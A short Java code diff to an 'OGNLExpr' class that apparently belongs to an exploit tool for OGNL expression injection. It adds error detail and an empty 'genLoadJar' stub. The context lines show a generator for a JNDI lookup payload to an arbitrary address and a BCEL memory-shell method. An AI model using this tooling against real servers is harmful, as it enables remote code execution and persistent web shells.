@@ -71,7 +71,8 @@ public class OGNLExpr implements IExpr {
             };
         } catch (Exception ex) {
             return new String[]{
-                    "class文件异常"
+                    "class文件异常",
+                    Utils.getErrDetail(ex)
             };
         }
     }
@@ -81,6 +82,11 @@ public class OGNLExpr implements IExpr {
         return new String[]{
                 out("new javax.naming.InitialContext().lookup('" + escape(jndiAddress) + "')")
         };
+    }
+
+    @Override
+    public String[] genLoadJar(String url, String className) {
+        return new String[0];
     }
 
     public String getBcelMemShell(byte[] memShellClass) throws IOException {
